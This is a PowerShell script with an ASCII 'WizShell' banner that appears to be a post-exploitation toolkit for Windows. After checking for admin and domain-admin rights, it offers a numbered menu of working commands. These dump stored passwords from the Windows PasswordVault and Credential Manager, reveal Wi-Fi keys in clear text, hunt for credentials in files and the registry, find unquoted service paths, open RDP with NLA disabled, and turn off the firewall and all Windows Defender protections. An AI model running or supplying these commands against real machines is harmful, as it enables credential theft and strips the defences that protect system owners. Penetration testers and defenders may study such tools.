# Section 1
$l1 = @(' 
              
█████   ███   █████  ███              █████████  █████               ████  ████ 
░░███   ░███  ░░███  ░░░              ███░░░░░███░░███               ░░███ ░░███ 
 ░███   ░███   ░███  ████   █████████░███    ░░░  ░███████    ██████  ░███  ░███ 
 ░███   ░███   ░███ ░░███  ░█░░░░███ ░░█████████  ░███░░███  ███░░███ ░███  ░███ 
 ░░███  █████  ███   ░███  ░   ███░   ░░░░░░░░███ ░███ ░███ ░███████  ░███  ░███ 
  ░░░█████░█████░    ░███    ███░   █ ███    ░███ ░███ ░███ ░███░░░   ░███  ░███ 
    ░░███ ░░███      █████  █████████░░█████████  ████ █████░░██████  █████ █████
     ░░░   ░░░      ░░░░░  ░░░░░░░░░  ░░░░░░░░░  ░░░░ ░░░░░  ░░░░░░  ░░░░░ ░░░░░ ')                        
    

$l1; 
$h = hostname
$u = $env:UserName
$d = (Get-CimInstance Win32_ComputerSystem).Domain

$sesh = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)


if ($sesh -eq "True"){
    $sessionadmin = "Admin Session"
    $tc = "Green"
} else {
    $sessionadmin = "User Session"
    $tc = "Yellow"
}

if ($d -eq "WORKGROUP"){
    $dom = "WORKGROUP" 
    $dtc = "Red"
} else {
    $a = net group "domain admins" /domain
    $idom = select-string -pattern "$u" -InputObject $a

    if ($idom -eq $null){
        $dom = "False"
        $dtc = "Red"
    } else {
        $dom = "True"
        $dtc = "Green"
    }
}

Write-Host " Current User: " -NoNewline ; Write-Host "$u" -ForegroundColor Green -NoNewline ; Write-Host " | Current Machine: " -NoNewline ; Write-Host "$h" -ForegroundColor Blue
Write-Host " Session: " -NoNewline ; Write-Host "$sessionadmin " -ForegroundColor $tc -NoNewline ; Write-Host "  |  Domain Admin: " -NoNewline ; Write-Host "$dom" -ForegroundColor $dtc


# Section 2 [SCRIPT]

Write-Host ""
Write-Host "Choose a command to execute:"
Write-Host "1.Get installed programs"
Write-Host "2.Find potentially interesting files"
Write-Host "3.Information About Antivirus"
Write-Host "4.Information About Windows Defender"
Write-Host "5.Information About RealTimeProtection"
Write-Host "6.Locate web server configuration files"
Write-Host "7.Find credentials in Sysprep or Unattend files"
Write-Host "8.Find configuration files containing password string"
Write-Host "9.Get stored passwords from Windows PasswordVault"
Write-Host "10.Get stored passwords from Windows Credential Manager"
Write-Host "11.Get stored Wi-Fi passwords from Wireless Profiles"
Write-Host "12.Search for SNMP community string in registry"
Write-Host "13.Search registry for auto-logon credentials"
Write-Host "14.Find unquoted service paths"
Write-Host "15.Allow RDP connections"
Write-Host "16.Disable NLA"
Write-Host "17.Allow RDP on the firewall"
Write-Host "18.Check if computer is part of a domain"
Write-Host "19.Get workgroup name"
Write-Host "20.Check if system 32-bit or 64-bit"
Write-Host "21.Check HKLM\Software registry"
Write-Host "22.Get system uptime"
Write-Host "23.List all files in current directory"
Write-Host "24.List hidden file"
Write-Host "25.List only hidden files"
Write-Host "26.List all files recursively"
Write-Host "27.Disable Real-Time Protection"
Write-Host "28.Disable Firewall"
Write-Host "29.Disable Windows Defender"
Write-Host "30.Exit"
$choice = Read-Host "Choose a number"


if ($choice -eq "1"){

    Write-Host ""
    Write-Host "Installed Programs"
    Write-Host "---------------"
    Get-WmiObject -Class Win32_Product | Select-Object -Property Name, Version, InstallDate


} elseif ($choice -eq "2"){

    Write-Host ""
    Write-Host "Find Potentially Interesting Files"
    Write-Host "----------------------------------"
    gci c:\ -Include *pass*.txt,*pass*.xml,*pass*.ini,*pass*.xlsx,*cred*,*vnc*,*.config*,*accounts* -File -Recurse -EA SilentlyContinue

} elseif ($choice -eq "3"){

    Write-Host ""
    Write-Host "Information About Antivirus"
    Write-Host "----------------------------------"
    Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct

} elseif ($choice -eq "4"){

    Write-Host ""
    Write-Host "Information About Windows Defender"
    Write-Host "----------------------------------"
    Get-Service WinDefend

} elseif ($choice -eq "5"){

    Write-Host ""
    Write-Host "Information About RealTimeProtection"
    Write-Host "----------------------------------"
    Get-MpComputerStatus | select RealTimeProtectionEnabled

} elseif ($choice -eq "6"){
    
    Write-Host ""
    Write-Host "Locate web server configuration files"
    Write-Host "----------------------------------"
    gci c:\ -Include web.config,applicationHost.config,php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -EA SilentlyContinue
    
} elseif ($choice -eq "7"){

    Write-Host ""
    Write-Host "Find credentials in Sysprep or Unattend files"
    Write-Host "----------------------------------"
    gci c:\ -Include *sysprep.inf,*sysprep.xml,*sysprep.txt,*unattended.xml,*unattend.xml,*unattend.txt -File -Recurse -EA SilentlyContinue

} elseif ($choice -eq "8"){

    Write-Host ""
    Write-Host "Find configuration files containing password string"
    Write-Host "----------------------------------"
    gci c:\ -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern "password"

} elseif ($choice -eq "9"){

    Write-Host ""
    Write-Host "Get stored passwords from Windows PasswordVault"
    Write-Host "----------------------------------"
    [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }

} elseif ($choice -eq "10"){

    Write-Host ""
    Write-Host "Get stored passwords from Windows Credential Manager"
    Write-Host "----------------------------------"
    Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine ":" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }

} elseif ($choice -eq "11"){

    Write-Host ""
    Write-Host "Get stored Wi-Fi passwords from Wireless Profiles"
    Write-Host "----------------------------------"
    (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize

} elseif ($choice -eq "12"){

    Write-Host ""
    Write-Host "Search for SNMP community string in registry"
    Write-Host "----------------------------------"
    gci HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse -EA SilentlyContinue

} elseif ($choice -eq "13"){

    Write-Host ""
    Write-Host "Search registry for auto-logon credentials"
    Write-Host "----------------------------------"
    gp 'HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon' | select "Default*"

} elseif ($choice -eq "14"){

    Write-Host ""
    Write-Host "Find unquoted service paths"
    Write-Host "----------------------------------"
    gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name

} elseif ($choice -eq "15"){

    Write-Host ""
    Write-Host "Allow RDP connections"
    Write-Host "----------------------------------"
    (Get-WmiObject -Class "Win32_TerminalServiceSetting" -Namespace root\cimv2\terminalservices).SetAllowTsConnections(1)

} elseif ($choice -eq "16"){

    Write-Host ""
    Write-Host "Disable NLA"
    Write-Host "----------------------------------"
    (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)

} elseif ($choice -eq "17"){

    Write-Host ""
    Write-Host "Allow RDP on the firewall"
    Write-Host "----------------------------------"
    Get-NetFirewallRule -DisplayGroup "Remote Desktop" | Set-NetFirewallRule -Enabled True

} elseif ($choice -eq "18"){

    Write-Host ""
    Write-Host "Check if computer is part of a domain"
    Write-Host "----------------------------------"
    (Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain

} elseif ($choice -eq "19"){

    Write-Host ""
    Write-Host "Get workgroup name"
    Write-Host "----------------------------------"
    (Get-WmiObject -Class Win32_ComputerSystem).Workgroup


} elseif ($choice -eq "20"){

    Write-Host ""
    Write-Host "Check if system 32-bit or 64-bit"
    Write-Host "----------------------------------"
    [System.Environment]::Is64BitOperatingSystem
(Get-CimInstance -ClassName win32_operatingsystem).OSArchitecture

} elseif ($choice -eq "21"){

    Write-Host ""
    Write-Host "Check HKLM\Software registry"
    Write-Host "----------------------------------"
    Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\Software | ft Name

} elseif ($choice -eq "22"){

    Write-Host ""
    Write-Host "Get system uptime"
    Write-Host "----------------------------------"
    [Timespan]::FromMilliseconds([Environment]::TickCount)

} elseif ($choice -eq "23"){

    Write-Host ""
    Write-Host "List all files in current directory"
    Write-Host "----------------------------------"
    dir

} elseif ($choice -eq "24"){

    Write-Host ""
    Write-Host "List hidden file"
    Write-Host "----------------------------------"
    gci -Force

} elseif ($choice -eq "25"){

    Write-Host ""
    Write-Host "List only hidden files"
    Write-Host "----------------------------------"
    gci -Attributes !D+H


} elseif ($choice -eq "26"){

    Write-Host ""
    Write-Host "List all files recursively"
    Write-Host "----------------------------------"
    gci -Recurse

} elseif ($choice -eq "27"){

    Write-Host ""
    Write-Host "Disable Real-Time Protection"
    Write-Host "----------------------------------"
    Set-MpPreference -DisableRealtimeMonitoring $true

} elseif ($choice -eq "28"){

    Write-Host ""
    Write-Host "Disable Firewall"
    Write-Host "----------------------------------"
    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

} elseif ($choice -eq "29"){

    Write-Host ""
    Write-Host "Disable Windows Defender"
    Write-Host "----------------------------------"
    Set-MpPreference -DisableRealtimeMonitoring $true
    Set-MpPreference -DisableBehaviorMonitoring $true
    Set-MpPreference -DisableBlockAtFirstSeen $true
    Set-MpPreference -DisableIOAVProtection $true
    Set-MpPreference -DisablePrivacyMode $true
    Set-MpPreference -DisableArchiveScanning $true
    Set-MpPreference -DisableIntrusionPreventionSystem $true
    Set-MpPreference -DisableScriptScanning $true
    Set-MpPreference -EnableControlledFolderAccess Disabled

# The End
} elseif ($choice -eq "00"){

    
    Write-Host ""
    Write-Host "Exit"
    Write-Host "---------------"
    Exit
    Write-Host ""
}
